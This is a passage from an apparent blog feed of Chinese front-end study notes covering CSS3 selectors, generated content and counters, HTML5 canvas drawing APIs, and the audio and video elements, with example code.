#firstname 选择所有id=”firstname”的元素 1 * * 选择所有元素 2 element p 选择所有元素 1 element,element div,p 选择所有元素和元素 1 element element div p 选择元素内的所有元素 1 element&gt;element div&gt;p 选择所有父级是 元素的 元素 2 element+element div+p 选择所有紧接着元素之后的元素 2 attribute [target] 选择所有带有target属性元素 2 attribute=value [target=-blank] 选择所有使用target=”-blank”的元素 2 attribute~=value [title~=flower] 选择标题属性包含单词”flower”的所有元素 2 attribute =language[lang\ =en] 选择 lang 属性以 en 为开头的所有元素 2 :link a:link 选择所有未访问链接 1 :visited a:visited 选择所有访问过的链接 1 :active a:active 选择活动链接 1 :hover a:hover 选择鼠标在链接上面时 1 :focus input:focus 选择具有焦点的输入元素 2 :first-letter p:first-letter 选择每一个元素的第一个字母 1 :first-line p:first-line 选择每一个元素的第一行 1 :first-child p:first-child 指定只有当元素是其父级的第一个子级的样式。 2 :before p:before 在每个元素之前插入内容 2 :after p:after 在每个元素之后插入内容 2 :lang(language) p:lang(it) 选择一个lang属性的起始值=”it”的所有元素 2 element1~element2 p~ul 选择p元素之后的每一个ul元素 3 attribute^=value a[src^=”https”] 选择每一个src属性的值以”https”开头的元素 3 attribute$=value a[src$=”.pdf”] 选择每一个src属性的值以”.pdf”结尾的元素 3 attribute=value a[src*=”runoob”] 选择每一个src属性的值包含子字符串”runoob”的元素 3 :first-of-type p:first-of-type 选择每个p元素是其父级的第一个p元素 3 :last-of-type p:last-of-type 选择每个p元素是其父级的最后一个p元素 3 :only-of-type p:only-of-type 选择每个p元素是其父级的唯一p元素 3 :only-child p:only-child 选择每个p元素是其父级的唯一子元素 3 :nth-child(n) p:nth-child(2) 选择每个p元素是其父级的第二个子元素 3 :nth-last-child(n) p:nth-last-child(2) 选择每个p元素的是其父级的第二个子元素，从最后一个子项计数 3 :nth-of-type(n) p:nth-of-type(2) 选择每个p元素是其父级的第二个p元素 3 :nth-last-of-type(n) p:nth-last-of-type(2) 选择每个p元素的是其父级的第二个p元素，从最后一个子项计数 3 :last-child p:last-child 选择每个p元素是其父级的最后一个子级。 3 :root :root 选择文档的根元素 3 :empty p:empty 选择每个没有任何子级的p元素（包括文本节点） 3 :target #news:target 选择当前活动的#news元素（包含该锚名称的点击的URL） 3 :enabled input:enabled 选择每一个已启用的输入元素 3 :disabled input:disabled 选择每一个禁用的输入元素 3 :checked input:checked 选择每个选中的输入元素 3 :not(selector) :not(p) 选择每个并非p元素的元素 3 ::selection ::selection 匹配元素中被用户选中或处于高亮状态的部分 3 :out-of-range :out-of-range 匹配值在指定区间之外的input元素 3 :in-range :in-range 匹配值在指定区间之内的input元素 3 :read-write :read-write 用于匹配可读及可写的元素 3 :read-only :read-only 用于匹配设置 “readonly”（只读） 属性的元素 3 :optional :optional 用于匹配可选的输入元素 3 :required :required 用于匹配设置了 “required” 属性的元素 3 :valid :valid 用于匹配输入值为合法的元素 3 :invalid :invalid 用于匹配输入值为非法的元素 3 在页面插入内容:before或者 :after 123456789101112131415161718192021222324252627282930/* 插入文字 *//* 在h2前 */h2:before&#123; content:'哈哈哈'&#125;/* 在h2后 */h2:after&#123; content:'内容'&#125;/* 指定个别元素不进行插入 */h2.sample:before&#123; content:none&#125;/* 插入图像 *//* 在h2前 */h2:bofore&#123; content:url(mark.png);&#125;/* 在h2后 */h2:after&#123; content:url(mark.png);&#125;/* 将元素属性作为content的值来显示 */img:after&#123; context:attr(alt); display:block; text-align:center; margin-top:5px;&#125; content插入项目编号 1234&lt;h1&gt;大标题&lt;/h1&gt;&lt;p&gt;实例文字&lt;/p&gt;&lt;h1&gt;大标题&lt;/h1&gt;&lt;p&gt;实例文字&lt;/p&gt; 12345678910111213141516171819202122232425262728293031323334353637/*多个标题加上连续编号*/h1:before&#123; content:counter(mycounter)&#125;h1&#123; counter-increment:mycounter;&#125;/*追加文字*/h1:before&#123; content:'第'counter(mycounter)'章'&#125;h1&#123; counter-increment:mycounter;&#125;/* 指定样式 */h1:before&#123; content:'第'counter(mycounter)'章'; color:blue; font-size:42px;&#125;h1&#123; counter-increment:mycounter;&#125;/* 指定编号种类 list-style-type的值*//* content(计数器名，编号种类)*/h1:before&#123; content:'第'counter(mycounter,lower-roman)'章'; color:blue; font-size:42px;&#125;/* 编号嵌套 */p:bofore&#123; content:counter(mycounter2,lower-roman);&#125;p&#123; counter-increment:mycounter2;&#125; list-style-type 的值 值 描述 none 无标记。 disc 默认。标记是实心圆。 circle 标记是空心圆。 square 标记是实心方块。 decimal 标记是数字。 decimal-leading-zero 0开头的数字标记。(01, 02, 03, 等。) lower-roman 小写罗马数字(i, ii, iii, iv, v, 等。) upper-roman 大写罗马数字(I, II, III, IV, V, 等。) lower-alpha 小写英文字母The marker is lower-alpha (a, b, c, d, e, 等。) upper-alpha 大写英文字母The marker is upper-alpha (A, B, C, D, E, 等。) lower-greek 小写希腊字母(alpha, beta, gamma, 等。) lower-latin 小写拉丁字母(a, b, c, d, e, 等。) upper-latin 大写拉丁字母(A, B, C, D, E, 等。) hebrew 传统的希伯来编号方式 armenian 传统的亚美尼亚编号方式 georgian 传统的乔治亚编号方式(an, ban, gan, 等。) cjk-ideographic 简单的表意数字 hiragana 标记是：a, i, u, e, o, ka, ki, 等。（日文片假名） katakana 标记是：A, I, U, E, O, KA, KI, 等。（日文片假名） hiragana-iroha 标记是：i, ro, ha, ni, ho, he, to, 等。（日文片假名） katakana-iroha 标记是：I, RO, HA, NI, HO, HE, TO, 等。（日文片假名） 参考链接 CSS3伪类和伪元素的特性和区别 HTML 5与CSS 3权威指南 W3cScholl CSS3新增的选择器和属性 神奇的css3（1）新增属性、选择器]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试官问我HTML5是什么（中）]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E6%88%91HTML5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%AD%EF%BC%89.html</url>
    <content type="text"><![CDATA[学习链接：HTML 5与CSS 3权威指南 W3cScholl CanvasHTML5 中的一个新增元素，可以在页面绘制出各种漂亮的图形与图像。 绘制图形canvas 元素就是 HTML5 中新增的一个用来绘制图形。在页面上放置一个 canvas元素，相当于在页面上放置一块画布，可以在其中进行图形绘制。 在页面中放置 canvas元素12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Canvas&lt;/title&gt;&lt;/head&gt;&lt;body onload="draw('canvas')"&gt; &lt;canvas id="canvas" width="400" height="300"&gt;&lt;/canvas&gt; &lt;script src="canvas.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--script--&gt;&lt;script&gt;function draw(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); context.fillStyle = 'red'; context.strokeStyle = 'blue'; context.lineWidth = 1; context.fillRect(50,50,100,100); context.strokeRect(50,50,100,100);&#125;&lt;/script&gt; 首先，要指定 ID,width,height 这三个属性。 绘制矩形 取得 canvas 元素，用 DOM 方法取得要绘制的目标元素 取得上下文（context）。进行绘制的时候需要用到图形上下文（graphics context），图形上下文是一个封装了很多绘图功能的对象。使用 canvas 对象的 getContext方法来获得图形上下文。 填充与绘制边框。绘制图形的时候有两种方式：填充（fill）与绘制边框（stroke）。填充是指填充图形内部，绘制边框是指不填充图形内部，值绘制图形的外框。 设定绘图样式（style）。在进行图形绘制的时候，要设定好绘图的样式，然后调用相关的方法进行图形绘制。相关的属性有 fillStyle(填充图形的样式)，strokeStyle(图形边框的样式) 指定线宽。使用图形上下文对象的 lineWidth 属性设置图形边框的宽度。 指定颜色值。颜色名，或者十六进制的颜色值 分别使用 fillRect 与 strokeRect 方法来填充矩形和绘制矩形边框。 12context.fillRect(x,y,width,height);context.strokeRect(x,y,width,height); 还有一个 clearRect 方法，擦除指定矩形区域中的图形，使得矩形中的颜色全部变成透明。 1context.clearRect(x,y,width,height); 使用路径绘制圆形使用路径绘制图形的过程： 开始创建路径 创建图形的路径 路径创建完成后，关闭路径 设定绘制样式，调用绘制方法，绘制路径 大概的意思就是，先用路径勾勒图形轮廓，然后设置颜色，进行绘制。 1234567891011121314function drawCircle(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); for (let i = 0; i &lt; 10; i++) &#123; context.beginPath(); context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true) context.closePath(); context.fillStyle = 'rgba(255,0,0,0.25)'; context.fill(); &#125;&#125; 其中，context.arc(x,y,radius,startAngle,endAngle,anticlockwise) 这个方法使用了六个参数，x为绘制圆形的横坐标，y为纵坐标，radius为圆形半径，startAngle为开始的角度，endAngle为结束角度，anticlockwise为是否按顺时针方向进行绘制。 关于角度与弧度的计算 1let radius = degress * Math.PI / 180; arc方法不仅可以用阿里绘制圆形，也可以用来绘制圆弧。因此，使用时必须要指定开始角度与结束角度。因为这两个角度决定了弧度。anticlockwise为一个布尔值的参数，参数为 true 时，按顺时针绘制，参数为 false时，按逆时针绘制。 绘制完图形后，使用 context.closePath()将路径关闭，接着就可以使用 fill方法（stroke）填充图形与绘制图形边框了。 不关闭路径如果不关闭路径，已经创建的路径会被永远保留，使用 fill 或者 stroke 绘制的时候会重复绘制已存在的路径 123456789101112function drawCircle(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); for (let i = 0; i &lt; 10; i++) &#123; context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true) context.fillStyle = 'rgba(255,0,0,0.25)'; context.fill(); &#125;&#125; 绘制线moveTo 与 lineTo moveTo 方法的作用是将光标移动到指定坐标，绘制直线的时候以这个坐标点为起点 1moveTo(x,y) lineTo方法，也是用两个参数，x ，y表示直线终点的横纵坐标。使用该方法绘制直线后，光标会自动移动到 lineTo 方法参数所指定的直线终点。 12345678910111213141516171819202122function drawLine(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); let dx = 150; let dy = 150; let s = 100; context.beginPath(); context.fillStyle = 'rgb(100,255,100)'; context.strokeStyle = 'rgb(0,0,100)'; let dig = Math.PI / 15 * 11; for (let i = 0; i &lt; 30; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.lineTo(dx + x * s, dy + y * s); &#125; context.closePath() context.fill(); context.stroke();&#125; 使用 bezierCurveTo 绘制贝塞尔曲线1context.bezierCurveTo(cp1x,cp1y,cp2x,cpy2y,x,y); 绘制曲线，需要两个控制点以及一点终点。 12345678910111213141516171819202122function drawBezierLine(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); let dx = 150; let dy = 150; let s = 100; context.beginPath(); context.fillStyle = 'rgb(100,255,100)'; context.strokeStyle = 'rgb(0,0,100)'; let dig = Math.PI / 15 * 11; for (let i = 0; i &lt; 30; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.bezierCurveTo(dx + x * s, dy + y * s - 100, dx + x * s + 100, dy + y * s, dx + x * s, dy + y * s); &#125; context.closePath() context.fill(); context.stroke();&#125; quadraticCurveTo方法绘制二次贝塞尔曲线 1context.quadraticCurveTo(cpx,cpy,x,y) 绘制渐变图形绘制线性渐变绘制线性渐变需要用到 lineargradient对象。 1context.createLinearGradient(xStart,yStart,xEnd,yEnd); 接着使用 addColorStop 方法设定 1context.addColorStop(offset,color); offset 为所设定的颜色离开渐变起始点的偏移量。参数的值是0到1之间的浮点值，渐变起始点的偏移量是0，渐变结束点的偏移量是1. 1234567891011121314151617181920function drawLineGradient(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const gl = context.createLinearGradient(0, 0, 0, 300); gl.addColorStop(0, 'rgb(255,255,0)'); gl.addColorStop(1, 'rgb(0,255,255)'); context.fillStyle = gl; context.fillRect(0, 0, 400, 300); const g2 = context.createLinearGradient(0, 0, 300, 0); g2.addColorStop(0, 'rgba(0,0,255,0.5)'); g2.addColorStop(0, 'rgba(255,0,0,0.5)'); for (let i = 0; i &lt; 10; i++) &#123; context.beginPath(); context.fillStyle = g2; context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true); context.closePath(); context.fill(); &#125;&#125; 绘制径向渐变1context.createRadialGradient(xStart,yStart,radiusStart,xEnd,yEnd,radiusEnd); 分别指定两个圆的大小和位置。从第一个圆的圆心处向外进行扩散渐变，一直扩散到第二个圆的外轮廓处。 12345678910111213141516171819202122function drawRadialGradient(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const g1 = context.createRadialGradient(400, 0, 0, 400, 0, 400); g1.addColorStop(0.1, 'rgb(255,255,0)'); g1.addColorStop(0.3, 'rgb(255,0,255)'); g1.addColorStop(1, 'rgb(0,255,255)'); context.fillStyle = g1; context.fillRect(0, 0, 400, 300); const g2 = context.createRadialGradient(250, 250, 0, 250, 250, 300); g2.addColorStop(0.1, 'rgb(255,0,0,0.5)'); g2.addColorStop(0.7, 'rgb(255,255,0,0.5)'); g2.addColorStop(1, 'rgb(0,0,255,0.5)'); for (let i = 0; i &lt; 10; i++) &#123; context.beginPath(); context.fillStyle = g2; context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true); context.closePath(); context.fill(); &#125;&#125; 绘制变形图形坐标变换主要有三种形式： 平移，使用图形上下文的 translate方法来移动图形坐标轴原点。 1context.translate(x,y); 扩大，使用对象的 scale方法将图形放大 1context.scale(x,y) 旋转，使用 rotate方法将图形进行旋转 1context.rotate(angle); 旋转中西是坐标轴的原点，顺时针方法 12345678910111213141516function drawDeformationGraphics(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); // 改变圆心位置 context.translate(200, 50); context.fillStyle = 'rgba(255,0,0,0.25)'; for (let i = 0; i &lt; 50; i++) &#123; context.translate(25, 25); context.scale(0.95, 0.95); context.rotate(Math.PI / 10); context.fillRect(0, 0, 100, 50); &#125;&#125; 上面的代码使用坐标变换的方法。首先绘制了一个长方形，然后在一个循环中反复使用平移坐标轴，图形缩小，图形旋转三种技巧绘制出来变形图形。 与路径结合使用1234567891011121314151617181920212223242526272829303132function drawDeformationGraphicsWithFivePointedStar(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); context.translate(200, 50); context.fillStyle = 'rgba(255,0,0,0.25)'; for (let i = 0; i &lt; 50; i++) &#123; context.translate(25, 25); context.scale(0.95, 0.95); context.rotate(Math.PI / 10); createFivePointedStar(context); context.fill(); &#125;&#125;function createFivePointedStar(context) &#123; context.beginPath(); context.fillStyle = 'rgba(255,0,0,0.5)'; const dx = 100; const dy = 0; const s = 50; let dig = Math.PI / 5 * 4; for (let i = 0; i &lt; 5; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.lineTo(dx + x * s, dy + y * s); &#125; context.closePath();&#125; 矩阵变换当图形上下文被创建完毕时，事实上也创建了一个默认的变换矩阵，如果不对这个变换矩阵进行修改，绘制的图形将以画布的最左上角为坐标原点绘制图形，绘制出来的图形也不经过缩放、变形的处理。我们可以对这个变换矩形进行修改 1context.transform(a , b , c , d , e , f ) 参数 描述 a 水平缩放绘图 b 水平倾斜绘图 c 垂直倾斜绘图 d 垂直缩放绘图 e 水平移动绘图 f 垂直移动绘图 12345678910111213141516function drawTransform(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const colors = ['red', 'orange', 'yellow', 'green', 'blue', 'navy', 'purple']; context.lineWidth = 10; context.transform(1, 0, 0, 1, 100, 0); for (let i = 0; i &lt; colors.length; i++) &#123; // 定义每次向下移动 10个像素的变换矩阵 context.transform(1, 0, 0, 1, 0, 10); context.strokeStyle = colors[i]; context.beginPath(); context.arc(50, 100, 100, 0, Math.PI, true); context.stroke(); &#125;&#125; setTransform 会将变换矩阵重置 1setTransform(m11,m12,m21,m22,dx,dy) 1234567891011121314151617181920function drawSetTransform(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.strokeStyle = 'red'; context.strokeRect(30, 10, 60, 20); let rad = 45 * Math.PI / 180; context.setTransform(Math.cos(rad), Math.sin(rad), -Math.sin(rad), Math.cos(rad), 0, 0); context.strokeStyle = 'blue'; context.strokeRect(30, 10, 60, 20); context.setTransform(2.5, 0, 0, 2.5, 0, 0); context.strokeStyle = 'green'; context.strokeRect(30, 10, 60, 20); context.setTransform(1, 0, 0, 1, 40, 80); context.strokeStyle = 'gray'; context.strokeRect(30, 10, 60, 20);&#125; 图形组合设定图形上下文对象的 globalCompositeOperation属性能自己决定图形的组合方式 1context.globalCompositeOperation = type type 的值必须是下面几种字符串之一： source-over(默认值) 表示新图形覆盖杂原有图形上 destination-over 表示在原有图形之下绘制新图形 source-in 新图形与原有图形作 in 运算，只显示新图形中与原有图像相互重叠的部分，新图形与原有图形的其他部分均变成透明 destination-in 原有图形与新图形作 in 运算，只显示原有图形中与新图形相重叠的部分，新图形与原有图形的其他部分均变成透明 source-out 新图形与原有图形 out 运算。只显示新图形中与原有图形不重叠的部分，新图形与原有图形的其他部分变成透明 destination-out 新图形与原有图形 out 运算。只显示原有图形中与新图形不重叠的部分，原有图形与新图形的其他部分变成透明 source-atop 只绘制新图形中与原有图形重叠的部分与未被重叠覆盖的原有图形，新图形的其他部分变成透明 destination-atop 只绘制原有图形中被新图形重叠覆盖的部分与新图形的其他部分，原有图形中的其他部分变成透明，不绘制新图形中与原有图形相重叠的部分 lighter 原有图形与新图形均绘制，重叠部分做加色处理 xor 只绘制新图形中与原有图形不重叠的部分，重叠部分变成透明 copy 只绘制新图形，原有图形中未与新图形重叠的部分变成透明 给图形绘制阴影 shadowOffsetX——阴影的横线位移量 shadowOffsetY——阴影的纵向位移量 shadowColor——阴影的颜色 shadowBlur——阴影的模糊范围 1234567891011121314151617function drawShadowFifthStar(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); context.shadowOffsetX = 10; context.shadowOffsetY = 10; context.shadowColor = 'rgba(100,100,100,0.5)'; context.shadowBlur = 7.5; context.translate(0, 50); for (let i = 0; i &lt; 3; i++) &#123; context.translate(50, 50); createFivePointedStar(context); context.fill(); &#125;&#125; 使用图像绘制图像12345678// 宽高 为原图像宽高context.drawImage(image,x,y);// 增加宽高的自定义context.drawImage(image,x,y,w,h)// 将画布中绘制好的图像的全部或者部分复制到画布的另一个位置上context.drawImage(image,sx,sy,sw,sh,dx,dy,dw,dh) 1234567891011121314151617181920212223function drawCanvasImage(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300) image = new Image(); image.src = '../Desktop/微信图片_20190311090059.jpg' image.onload = function () &#123; drawBigImage(context, image) &#125;&#125;function drawImage(context, image) &#123; for (let i = 0; i &lt; 7; i++) &#123; context.drawImage(image, 0 + i * 50, 0 + i * 25, 100, 100); &#125;&#125;function drawBigImage(context, image) &#123; context.drawImage(image, 0, 0, 100, 100); context.drawImage(image, 23, 5, 57, 80, 110, 0, 100, 100);&#125; 图像平铺12345678910111213function drawTileImage(canvas, context, image) &#123; console.log(canvas); const scale = 5; let n1 = image.width / scale; let n2 = image.height / scale; let n3 = canvas.width / n1; let n4 = canvas.height / n2; for (let i = 0; i &lt; n3; i++) &#123; for (let j = 0; j &lt; n4; j++) &#123; context.drawImage(image, i * n1, j * n2, n1, n2); &#125; &#125;&#125; 上面使用变量和循环来实现图像平铺。还可以用更简便的图形上下文的 createPattern方法。 1context.createPattern(image,type) image 参数为要平铺的图像，type 参数： no-repeat：不平铺 repeat-x：横方向平铺 repeat-y：纵方向平铺 repeat：全方向平铺 123456789101112131415161718192021function drawCanvasImage(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300) image = new Image(); image.src = '../Desktop/微信图片_20190311090059.jpg'; image.width = 10; image.onload = function () &#123; const canvasTemp = document.createElement('canvas'); const contextTemp = canvasTemp.getContext('2d'); canvasTemp.width = 100; canvasTemp.height = 100; contextTemp.drawImage(this,0,0,100,100); let ptrn = context.createPattern(canvasTemp,'repeat'); // context.drawImage(image, 23, 5, 57, 80); context.fillStyle = ptrn; context.fillRect(0, 0, 400, 300) &#125;&#125; 当图像太大的时候，可以通过把图像绘制在一个临时的 canvas 里面，然后再用主canvas 重复这个临时 canvas 图像裁剪使用 clip 方法设置裁剪区域 123456789101112131415161718192021222324252627282930313233function cutImage(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const gr = context.createLinearGradient(0, 400, 300, 0); gr.addColorStop(0, 'rgb(255,255,0)'); gr.addColorStop(1, 'rgb(0,255,255)'); context.fillStyle = gr; context.fillRect(0, 0, 400, 300); image = new Image(); image.src = '../Desktop/微信图片_20190311090059.jpg'; image.onload = function () &#123; createFivePointedStar(context); context.drawImage(image, -50, -150, 400, 300); &#125;&#125;function createFivePointedStar(context) &#123; context.beginPath(); context.translate(100,150); context.fillStyle = 'rgba(255,0,0,0.5)'; const dx = 100; const dy = 0; const s = 50; let dig = Math.PI / 5 * 4; for (let i = 0; i &lt; 5; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.lineTo(dx + x * s, dy + y * s); &#125; context.closePath(); context.clip();&#125; 像素处理使用 getImageData 方法可以获取图像中的像素,获得像素组依次 rgba 值。 1imageData = context.getImageData(x,y,width,height); 参数 描述 x 开始复制的左上角位置的 x 坐标。 y 开始复制的左上角位置的 y 坐标。 width 将要复制的矩形区域的宽度。 height 将要复制的矩形区域的高度。 对于 ImageData 对象中的每个像素，都存在着四方面的信息，即 RGBA 值： R - 红色 (0-255) G - 绿色 (0-255) B - 蓝色 (0-255) A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的) 利用 putImageData 将图像数据放回画布,期间做一些颜色处理，可以模拟滤镜。 1234567891011image.onload = function () &#123; // createFivePointedStar(context); context.drawImage(image, 0, 0, 400, 300); let imagedata = context.getImageData(0, 0, image.width, image.height) for (let i = 0, n = imagedata.data.length; i &lt; n; i += 4) &#123; imagedata.data[i + 0] = 255 - imagedata.data[i + 0]; imagedata.data[i + 1] = 255 - imagedata.data[i + 2]; imagedata.data[i + 2] = 255 - imagedata.data[i + 1]; &#125; context.putImageData(imagedata, 0, 0, 400, 300);&#125; 1context.putImageData(imgData,x,y,dirtyX,dirtyY,dirtyWidth,dirtyHeight); 参数 描述 imgData 规定要放回画布的 ImageData 对象。 x ImageData 对象左上角的 x 坐标，以像素计。 y ImageData 对象左上角的 y 坐标，以像素计。 dirtyX 可选。水平值（x），以像素计，在画布上放置图像的位置。 dirtyY 可选。水平值（y），以像素计，在画布上放置图像的位置。 dirtyWidth 可选。在画布上绘制图像所使用的宽度。 dirtyHeight 可选。在画布上绘制图像所使用的高度。 绘制文字fillText 填充方式绘制字符串 1context.fillText(text,x,y,maxWidth); maxWidth，允许最大的宽度，像素单位 strokeText 用轮廓方式绘制字符串 1context.strokeText(text,x,y,maxWidth); 一些关于文字绘制的属性： font：字体 textAlign：水平对齐方式，start(默认)、end、left、right、center textBaseline：垂直对齐方式，top、hanging、middle、alphabetic(默认)、ideographic、bottom 获得文字的宽度 1context.measureText(text) 接受一个参数 text，该参数为需要绘制的文字，返回一个 TextMetrics 对象，TextMetrics对象的 width 属性表示使用当前指定的文字后 text 参数中指定的文字的总文字宽度 1234567891011121314function drawText(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.font = 'italic 20px sans-serif'; let txt = '字符串的宽度为：'; let tml = context.measureText(txt); context.fillText(txt, 10, 30); context.fillText(tml.width, tml.width + 10, 30); context.font = 'bold 30px sans-serif'; let tm2 = context.measureText(txt); context.fillText(txt, 10, 70); context.fillText(tm2.width, tm2.width + 10, 70);&#125; 其他保存与恢复状态1234// 将当前状态保存到 栈中context.save();// 从栈中取出之前保存的图形上下文的状态进行恢复 context.restore(); 绘画状态包括坐标的原点、变形时的变换矩阵，图形上下文对象的当前属性值。 可以应用在下面但不仅仅下面的场景： 图像或图形变形 图像裁剪 改变图形上下文的以下属性的时候：fillStyle、font、globalAlpha、globalComposite、Operation、lineCap、lineJoin、lineWidth、miterLimit、shadowBlur、shadowColor、shadowOffsetX、shadowOffsetY、strokeStyle、textAlign、textBaseline 保存文件 原理实际上是把当前的绘画状态输出到一个 data URL 地址所指向的数据中的过程。data URL指的是目前大部分浏览器能够识别的一种 base64编码的 URL，主要用于小型的、可以在网页中直接嵌入的，而不需要从外部文件嵌入的数据，例如 img 元素中的图像文件等。 toDataURL 方法把绘画状态输出到一个 data URL中，然后重新装载，客户可以直接把装载后的文件进行保存。 12canvas.toDataURL(type);// type 表示输出输出类型的 MIME 类型 12345678910function drawDataURL(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = 'rgb(0,0,255)'; context.fillRect(0, 0, canvas.width, canvas.height); context.fillStyle = 'rgb(255,255,0)'; context.fillRect(10, 20, 50, 50); console.log(canvas.toDataURL("image/jepg"))&#125; 简单动画的制作canvas 画布中制作的动画实际上就是一个不断擦除（clearRect）、重绘的过程。 12345678910111213141516function animationOnCanvas(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; context = canvas.getContext('2d'); width = canvas.width; height = canvas.height; i = 0; setInterval(rotate, 100);&#125;function rotate() &#123; context.clearRect(0, 0, width, height); context.fillStyle = 'red'; context.fillRect(i, 0, 20, 20); i += 20;&#125; 多媒体播放关于 video 与 audio元素HTML4页面中播放视频或者音频数据 1234567891011&lt;object classid="clsid:F08DF954-8592-11D1-B16A-00C0F0283628" id="Slider1" width="100" height="50"&gt; &lt;param name="BorderStyle" value="1" /&gt; &lt;param name="MousePointer" value="0" /&gt; &lt;param name="Enabled" value="1" /&gt; &lt;param name="Min" value="0" /&gt; &lt;param name="Max" value="10" /&gt; &lt;param name="allowFullScreen" value="true" /&gt; &lt;param name="allowscriptaccess" value="always" /&gt; &lt;embed type="application/x-shockwave-flash" width="425" height="344" src="p.swf" allowscriptaccess="always" allowfullscreen="true"&gt;&lt;/embed&gt;&lt;/object&gt; 可以看出上面代码的一些缺点：冗长，需要使用 Flash 插件，用户没有安装的话，则视频看不了。需要结合多个元素，并且需要添加很多属性。 HTML5 中的则是： 12345678910111213&lt;audio src='xxx.mp3'&gt; 您的浏览器器不支持 audio 元素&lt;/audio&gt;&lt;video width="640" height="360" src='xxx.mp4'&gt; 您的浏览器器不支持 video 元素&lt;/video&gt;&lt;!--结合 source元素为同一个媒体数据指定多个播放格式与编码方式，浏览器会从中找到一种自己支持的播放格式来播放 --&gt;&lt;video&gt; &lt;source src="sample.ogv" type="video/ogg";codecs="theora,vorbis"&gt; &lt;source src="sample.mov" type="video/quicktime"&gt;&lt;/video&gt;&lt;!--type指播放媒体的MIME类型，codes表示媒体的编码格式--&gt; 属性 src 指定媒体数据的 URL 地址 autoplay 指定媒体是否在页面加载后自动播放 preload 指定数据是否预加载。预加载浏览器会预先将视频或者音频数据缓冲，加快播放速度，因为播放时数据已经缓冲完毕。该属性有 none（不进行预加载）、metadata（只预加载媒体的元数据：媒体字节数、第一帧、播放列表、持续时间等）、auto(默认，表示预加载全部视频或者音频)。 poster(video独有) 当视频不可用的时候，可以使用该元素向用户展示一副替代用的图片。用户体验良好 loop 循环播放 controls 添加浏览器自带的播放用的控制条，具有播放、暂停等按钮。 width 与 height（video独有） 该属性中指定视频的宽度和高度（像素） error 读取使用媒体数据的过程中出错的话，返回一个 MediaError对象，该对象的code返回对应的错误状态，有4个值 MEDIA_ERR_ABORTED(数字值为1)：媒体数据的下载过程由于用户操作的原因而被中止 MEDIA_ERR_NETWORK(数字值为2)：确认媒体资源可用，但是在下载时出现网络错误，媒体数据的下载过程被中止 MEDIA_ERR_DECODE(数字值为3)：确认媒体资源可用，但是解码时发生错误。 MEDIA_ERR_SRC_NOT_SUPPORTED(数字值为4)：媒体资源不可用媒体格式不被支持，error属性为只读属性 1234567891011121314151617181920const video = document.getElementById('video element');video.addEventListener('error', function () &#123; let &#123; error &#125; = video; switch (error.code) &#123; case 1: console.log('视频的下载过程被中止'); break; case 2: console.log('网络发生故障，视频的下载过程被中止'); break; case 3: console.log('解码失败'); break; case 4: console.log('不支持的播放格式'); break; default: console.log('无'); &#125;&#125;, false); networkState,4个可能值 NETWORK_EMPTY(数字值为0)：音频/视频尚未初始化 NETWORK_IDLE(1)：音频/视频是活动的且已选取资源，但并未使用网络 NETWORK_LOADING(2)：浏览器正在下载数据 NETWORK_NO_SOURCE(3)：未找到音频/视频来源 12345678video.addEventListener('progress', function (e) &#123; const &#123; networkState &#125; = video; if (networkState === 2) &#123; x.innerHTML = 